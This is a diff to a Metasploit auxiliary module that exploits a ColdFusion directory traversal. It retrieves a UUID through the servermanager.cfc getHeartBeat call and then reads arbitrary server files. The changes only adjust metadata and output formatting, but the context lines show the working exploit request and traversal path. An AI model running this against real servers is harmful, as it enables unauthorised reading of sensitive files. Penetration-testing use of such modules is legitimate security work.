@@ -34,7 +34,7 @@ class MetasploitModule < Msf::Auxiliary
         'DisclosureDate' => '2024-03-12',
         'Notes' => {
           'Stability' => [CRASH_SAFE],
-          'Reliability' => [REPEATABLE_SESSION],
+          'Reliability' => [],
           'SideEffects' => [IOC_IN_LOGS]
         }
       )
@@ -55,9 +55,9 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'CFIDE', 'adminapi', '_servermanager', 'servermanager.cfc'),
       'vars_get' =>
-                               {
-                                 'method' => 'getHeartBeat'
-                               }
+       {
+         'method' => 'getHeartBeat'
+       }
     })
     fail_with(Failure::Unreachable, 'No response from the target when attempting to retrieve the UUID') unless res
 
@@ -71,7 +71,7 @@ class MetasploitModule < Msf::Auxiliary
   def run
     print_status('Attempting to retrieve UUID ...')
     uuid = get_uuid
-    print_good("UUID found:\n#{uuid}")
+    print_good("UUID found: #{uuid}")
     print_status("Attempting to exploit directory traversal to read #{datastore['FILE_NAME']}")
 
     traversal_path = '../' * datastore['DEPTH']
@@ -94,7 +94,7 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::Unknown, 'No response received') unless res
 
     if res.code == 200
-      print_good("File content:\n#{res.body}")
+      print_good("File content received:")
     else
       fail_with(Failure::UnexpectedReply, "Failed to retrieve file content, server responded with status code: #{res.code}")
     end
@@ -104,6 +104,7 @@ class MetasploitModule < Msf::Auxiliary
     # TODO  the file contents are listed after that but each line is prefixed with a "_"
     file_contents = []
     res.body.split("\n").each do |html_response_line|
+      print_status(html_response_line)
       file_contents << html_response_line
     end
 
